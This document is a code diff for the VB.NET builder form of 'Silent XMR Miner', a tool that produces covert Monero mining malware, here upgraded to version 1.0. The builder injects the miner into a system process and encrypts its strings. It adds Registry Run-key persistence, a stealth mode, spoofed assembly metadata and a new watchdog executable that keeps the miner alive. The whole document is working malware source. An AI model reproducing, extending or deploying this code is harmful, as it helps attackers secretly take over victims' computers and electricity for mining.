@@ -1,9 +1,12 @@
-﻿Imports System.Security.Cryptography
+﻿Imports System.IO
+Imports System.Security.Cryptography
 Imports System.Text
 
 Public Class Form1
     Public Shared rand As New Random()
     Public advancedParams As String = "--coin=monero --asm=auto --cpu-memory-pool=-1 --randomx-mode=auto --randomx-no-rdmsr  --cuda-bfactor-hint=12 --cuda-bsleep-hint=100"
+    Public watchdogdata As Byte() = New Byte() {}
+
     'Silent XMR Miner by Unam Sanctam https://github.com/UnamSanctam/SilentXMRMiner, based on Lime Miner by NYAN CAT https://github.com/NYAN-x-CAT/Lime-Miner
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
@@ -17,14 +20,11 @@ Public Class Form1
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
         Try
-            MephForm1.Text = "Silent XMR Miner Builder 0.9"
-            txtMaxCPU.SelectedIndex = 4
+            MephForm1.Text = "Silent XMR Miner Builder 1.0"
         Catch ex As Exception
         End Try
 
         Try
-            txtInstallPathMain.SelectedIndex = 0
-            txtInjection.SelectedIndex = 0
             txtAdvParam.Text = advancedParams
         Catch ex As Exception
         End Try
@@ -47,6 +47,7 @@ Public Class Form1
     Public Resources_xmr = Randomi(rand.Next(5, 10))
     Public Resources_xmrig = Randomi(rand.Next(5, 10))
     Public Resources_libs = Randomi(rand.Next(5, 10))
+    Public Resources_watchdog = Randomi(rand.Next(5, 10))
     Public Resources_winring = Randomi(rand.Next(5, 10))
     Public Resources_Parent = Randomi(rand.Next(5, 10))
     Public AESKEY As String = Randomi(rand.Next(5, 10))
@@ -80,24 +81,26 @@ Public Class Form1
         Try
             If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.ResetText()) : Else : txtLog.ResetText() : End If
             Dim InjectionTarget = txtInjection.Text.Split(" ")
-            Dim Source = My.Resources.Program
+            Dim MinerSource = My.Resources.Program
             txtLog.Text = txtLog.Text + ("Starting..." + vbNewLine)
             txtLog.Text = txtLog.Text + ("Replacing strings..." + vbNewLine)
-            Dim builder As New StringBuilder(Source)
+            Dim minerbuilder As New StringBuilder(MinerSource)
             Dim argstr As String = " -B " & If(chkAdvanced.Checked, txtAdvParam.Text, advancedParams) & " --url=" & txtPoolURL.Text & " --user=" & txtPoolUsername.Text & " --pass=" & txtPoolPassowrd.Text & " --cpu-max-threads-hint=" & txtMaxCPU.Text.Replace("%", "") & " --donate-level=5 "
-            argstr = Replace(argstr, "{%RANDOM%}", Guid.NewGuid.ToString().Replace("-", "").Substring(0, 10))
-            argstr = Replace(argstr, "{%COMPUTERNAME%}", RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", ""))
 
-            builder.Replace("#dll", Resources_dll)
-            builder.Replace("#xmr", Resources_xmrig)
-            builder.Replace("#libs", Resources_libs)
-            builder.Replace("#winring", Resources_winring)
-            builder.Replace("#ParentRes", Resources_Parent)
-            builder.Replace("#STARTDELAY", txtStartDelay.Text)
-            builder.Replace("#KEY", AESKEY)
-            builder.Replace("#LIBSPATH", EncryptString("WinCFG\Libs\"))
-            builder.Replace("#InjectionTarget", EncryptString(InjectionTarget(0)))
-            builder.Replace("#InjectionDir", EncryptString(InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", Environment.GetFolderPath(Environment.SpecialFolder.Windows))))
+            minerbuilder.Replace("#dll", Resources_dll)
+            minerbuilder.Replace("#xmr", Resources_xmrig)
+            minerbuilder.Replace("#libs", Resources_libs)
+            minerbuilder.Replace("#winring", Resources_winring)
+            minerbuilder.Replace("#watchdog", Resources_watchdog)
+            minerbuilder.Replace("#ParentRes", Resources_Parent)
+            minerbuilder.Replace("#STARTDELAY", txtStartDelay.Text)
+            minerbuilder.Replace("#KEY", AESKEY)
+            minerbuilder.Replace("#LIBSPATH", EncryptString("WinCFG\Libs\"))
+            minerbuilder.Replace("#DLLSTR", EncryptString("Project1.Program"))
+            minerbuilder.Replace("#DLLOAD", EncryptString("Load"))
+            minerbuilder.Replace("#REGKEY", EncryptString("Software\Microsoft\Windows\CurrentVersion\Run\"))
+            minerbuilder.Replace("#InjectionTarget", EncryptString(InjectionTarget(0)))
+            minerbuilder.Replace("#InjectionDir", EncryptString(InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", Environment.GetFolderPath(Environment.SpecialFolder.Windows))))
 
             If toggleEnableIdle.Checked Then
                 argstr += " --unam-idle-wait=" & txtIdleWait.Text & " --unam-idle-cpu=" & txtIdleCPU.Text.Replace("%", "") & " "
@@ -119,49 +122,68 @@ Public Class Form1
                 argstr += " --unam-stealth "
             End If
 
-            builder.Replace("#ARGSTR", EncryptString(argstr))
+            minerbuilder.Replace("#ARGSTR", EncryptString(argstr))
 
             If toggleEnableGPU.Checked Then
-                builder.Replace("#Const EnableGPU = False", "#Const EnableGPU = True")
-            End If
-
-            If toggleEnableHidden.Checked Then
-                builder.Replace("Public Shared IH As Boolean = False", "Public Shared IH As Boolean = True")
+                minerbuilder.Replace("#Const EnableGPU = False", "#Const EnableGPU = True")
             End If
 
             If chkInstall.Checked Then
                 txtLog.Text = txtLog.Text + ("Adding install... " + vbNewLine)
-                builder.Replace("#Const INS = False", "#Const INS = True")
-                builder.Replace("PayloadPath", "Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
+                minerbuilder.Replace("#Const INS = False", "#Const INS = True")
+                minerbuilder.Replace("PayloadPath", "System.IO.Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
+
+                If toggleWatchdog.Checked Then
+
+                    txtLog.Text = txtLog.Text + ("Compiling Watchdog..." + vbNewLine)
+                    Dim WatchdogSource = My.Resources.Watchdog
+                    Dim watchdogbuilder As New StringBuilder(WatchdogSource)
+
+                    watchdogbuilder.Replace("#InjectionTarget", EncryptString(InjectionTarget(0)))
+                    watchdogbuilder.Replace("#KEY", AESKEY)
+                    watchdogbuilder.Replace("PayloadPath", "System.IO.Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
+
+                    WatchdogSource = watchdogbuilder.ToString()
+
+                    Codedom.WatchdogCompiler(OutputPayload & "-watchdog", WatchdogSource)
+
+                    If Codedom.WatchdogOK Then
+                        txtLog.Text = txtLog.Text + ("Compiled Watchdog!" + vbNewLine)
+                        watchdogdata = File.ReadAllBytes(OutputPayload & "-watchdog.exe")
+                        File.Delete(OutputPayload & "-watchdog.exe")
+                    Else
+                        txtLog.Text = txtLog.Text + ("Error compiling Watchdog!" + vbNewLine)
+                    End If
+                End If
+
             End If
 
             If chkAssembly.Checked Then
                 txtLog.Text = txtLog.Text + ("Writing Assembly Information..." + vbNewLine)
-                builder.Replace("#Const Assembly = False", "#Const Assembly = True")
+                minerbuilder.Replace("#Const Assembly = False", "#Const Assembly = True")
 
-                builder.Replace("%Title%", txtTitle.Text)
-                builder.Replace("%Description%", txtDescription.Text)
-                builder.Replace("%Company%", txtCompany.Text)
-                builder.Replace("%Product%", txtProduct.Text)
-                builder.Replace("%Copyright%", txtCopyright.Text)
-                builder.Replace("%Trademark%", txtTrademark.Text)
-                builder.Replace("%v1%", num_Assembly1.Text)
-                builder.Replace("%v2%", num_Assembly2.Text)
-                builder.Replace("%v3%", num_Assembly3.Text)
-                builder.Replace("%v4%", num_Assembly4.Text)
-                builder.Replace("%Guid%", Guid.NewGuid.ToString)
-
+                minerbuilder.Replace("%Title%", txtTitle.Text)
+                minerbuilder.Replace("%Description%", txtDescription.Text)
+                minerbuilder.Replace("%Company%", txtCompany.Text)
+                minerbuilder.Replace("%Product%", txtProduct.Text)
+                minerbuilder.Replace("%Copyright%", txtCopyright.Text)
+                minerbuilder.Replace("%Trademark%", txtTrademark.Text)
+                minerbuilder.Replace("%v1%", num_Assembly1.Text)
+                minerbuilder.Replace("%v2%", num_Assembly2.Text)
+                minerbuilder.Replace("%v3%", num_Assembly3.Text)
+                minerbuilder.Replace("%v4%", num_Assembly4.Text)
+                minerbuilder.Replace("%Guid%", Guid.NewGuid.ToString)
             End If
 
-            Source = builder.ToString
+            MinerSource = minerbuilder.ToString
 
             If chkIcon.Checked AndAlso txtIconPath.Text IsNot "" Then
-                Codedom.Compiler(OutputPayload, Source, Resources_Parent, txtIconPath.Text)
+                Codedom.MinerCompiler(OutputPayload, MinerSource, Resources_Parent, txtIconPath.Text)
             Else
-                Codedom.Compiler(OutputPayload, Source, Resources_Parent, Nothing)
+                Codedom.MinerCompiler(OutputPayload, MinerSource, Resources_Parent, Nothing)
             End If
 
-            If Codedom.OK Then
+            If Codedom.MinerOK Then
 
                 txtLog.Text = txtLog.Text + ("Done!" + vbNewLine)
                 If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
